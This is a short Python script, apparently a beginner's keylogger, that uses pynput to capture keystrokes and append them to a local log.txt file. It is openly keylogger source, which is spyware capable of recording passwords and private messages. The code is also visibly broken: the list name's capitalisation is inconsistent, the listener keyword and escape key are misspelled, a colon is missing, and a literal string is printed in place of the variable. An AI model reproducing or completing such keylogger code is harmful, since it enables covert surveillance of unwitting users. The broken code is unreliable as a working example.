from pynput.keyboard import Key, Controller, Listener

Keyboard = Controller()

Keylogger=[]
def on_press(key):
    global keylogger

    string = str(key).replace("'","")
    keylogger.append(string)
    main_string = "  ".join(keylogger)
    print("main_string")
    if len(main_string) >15:
        with open('log.txt', 'a') as f:
            f.write(main_string)
            keylogger = []

def on_relase(key):
        if key == key.esc:
            return False

with Listener (on_press = on_press, on_relase = on_relase) as Listener
    Listener.join()
